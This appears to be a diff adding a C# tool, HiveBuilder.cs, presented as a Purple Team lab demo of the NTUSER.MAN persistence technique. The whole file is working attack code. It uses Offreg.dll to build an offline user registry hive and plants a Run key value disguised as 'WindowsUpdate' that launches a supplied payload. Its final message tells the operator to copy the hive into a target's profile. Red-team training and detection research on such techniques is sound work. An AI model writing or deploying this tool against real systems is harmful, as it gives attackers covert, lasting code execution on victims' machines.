@@ -1,0 +1,158 @@
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using Microsoft.Win32;
+
+// HiveBuilder.cs
+// Manual implementation of offline hive modification for Purple Team labs
+// Demonstrates the Offreg.dll API surface used in the NTUSER.MAN persistence technique
+
+class HiveBuilder
+{
+    // =========================================================
+    // P/Invoke: Offline Registry Library (Offreg.dll)
+    // Located at: C:\Windows\System32\offreg.dll
+    // =========================================================
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int OROpenHive(string hivePath, out IntPtr key);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORCreateHive(out IntPtr key);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORCreateKey(
+        IntPtr handle,
+        string subKey,
+        string Class,
+        uint dwOptions,
+        IntPtr securityDescriptor,
+        out IntPtr newKey,
+        out uint disposition);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORSetValue(
+        IntPtr handle,
+        string valueName,
+        uint dwType,
+        byte[] data,
+        uint cbData);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORSaveHive(IntPtr key, string hivePath, uint OsMajorVersion, uint OsMinorVersion);
+
+    [DllImport("offreg.dll")]
+    static extern int ORCloseKey(IntPtr key);
+
+    // =========================================================
+    // P/Invoke: RegLoadAppKeyW (advapi32.dll)
+    // Used to bootstrap a valid empty hive structure
+    // =========================================================
+
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern int RegLoadAppKey(
+        string lpFile,
+        out IntPtr phkResult,
+        uint samDesired,
+        uint dwOptions,
+        uint Reserved);
+
+    [DllImport("advapi32.dll")]
+    static extern int RegCloseKey(IntPtr hKey);
+
+    const uint REG_KEY_READ = 0x20019;
+    const uint REG_SZ = 1;
+
+    static void Main(string[] args)
+    {
+        if (args.Length < 3)
+        {
+            Console.WriteLine("Usage: HiveBuilder.exe <exported.reg> <output_NTUSER.MAN> <payload_path>");
+            Console.WriteLine("Example: HiveBuilder.exe export.reg NTUSER.MAN C:\\ProgramData\\update.exe");
+            return;
+        }
+
+        string regExportPath = args[0];
+        string outputHivePath = args[1];
+        string payloadPath = args[2];
+        string startupKeyName = "WindowsUpdate"; // Registry value name for the run key
+
+        Console.WriteLine("[*] Step 1: Bootstrapping valid empty hive via RegLoadAppKeyW...");
+
+        // Step 1: Use RegLoadAppKeyW to create an initial valid hive skeleton
+        // This is necessary because ORCreateHive alone produces a hive Windows rejects
+        string bootstrapPath = Path.GetTempFileName();
+        File.Delete(bootstrapPath); // RegLoadAppKeyW creates it fresh
+
+        IntPtr bootstrapHandle;
+        int ret = RegLoadAppKey(bootstrapPath, out bootstrapHandle, REG_KEY_READ, 0, 0);
+        if (ret != 0)
+        {
+            Console.WriteLine($"[-] RegLoadAppKeyW failed: 0x{ret:X8}");
+            Console.WriteLine("    Ensure you're running on Windows and have write access to %TEMP%");
+            return;
+        }
+        RegCloseKey(bootstrapHandle);
+        Console.WriteLine($"[+] Bootstrap hive created at: {bootstrapPath}");
+
+        // Step 2: Open the bootstrapped hive with Offreg
+        Console.WriteLine("[*] Step 2: Opening bootstrapped hive with OROpenHive (Offreg.dll)...");
+        IntPtr hiveHandle;
+        ret = OROpenHive(bootstrapPath, out hiveHandle);
+        if (ret != 0)
+        {
+            Console.WriteLine($"[-] OROpenHive failed: 0x{ret:X8}");
+            Console.WriteLine("    Ensure offreg.dll is in System32 (present on all Windows systems)");
+            return;
+        }
+        Console.WriteLine("[+] Hive opened successfully via Offreg.dll");
+
+        // Step 3: Create the Run key path
+        Console.WriteLine("[*] Step 3: Creating SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key...");
+        string runKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        IntPtr runKeyHandle;
+        uint disposition;
+        ret = ORCreateKey(hiveHandle, runKeyPath, null, 0, IntPtr.Zero, out runKeyHandle, out disposition);
+        if (ret != 0)
+        {
+            Console.WriteLine($"[-] ORCreateKey failed: 0x{ret:X8}");
+            ORCloseKey(hiveHandle);
+            return;
+        }
+        Console.WriteLine($"[+] Run key created (disposition: {(disposition == 1 ? "CREATED" : "OPENED")})");
+
+        // Step 4: Set the persistence value
+        Console.WriteLine($"[*] Step 4: Setting startup value '{startupKeyName}' -> '{payloadPath}'...");
+        byte[] valueData = Encoding.Unicode.GetBytes(payloadPath + "\0");
+        ret = ORSetValue(runKeyHandle, startupKeyName, REG_SZ, valueData, (uint)valueData.Length);
+        if (ret != 0)
+        {
+            Console.WriteLine($"[-] ORSetValue failed: 0x{ret:X8}");
+            ORCloseKey(runKeyHandle);
+            ORCloseKey(hiveHandle);
+            return;
+        }
+        Console.WriteLine("[+] Persistence value written to offline hive");
+
+        ORCloseKey(runKeyHandle);
+
+        // Step 5: Save the hive to the output path
+        Console.WriteLine($"[*] Step 5: Saving hive to {outputHivePath} via ORSaveHive...");
+        ret = ORSaveHive(hiveHandle, outputHivePath, 10, 0); // Windows 10 = major 10, minor 0
+        if (ret != 0)
+        {
+            Console.WriteLine($"[-] ORSaveHive failed: 0x{ret:X8}");
+            ORCloseKey(hiveHandle);
+            return;
+        }
+        ORCloseKey(hiveHandle);
+
+        // Cleanup bootstrap temp file
+        try { File.Delete(bootstrapPath); } catch { }
+
+        Console.WriteLine($"[+] SUCCESS: NTUSER.MAN hive written to {outputHivePath}");
+        Console.WriteLine($"[+] Payload configured: {startupKeyName} = {payloadPath}");
+        Console.WriteLine("[*] Next step: Copy NTUSER.MAN to target's %USERPROFILE% directory");
+    }
+}
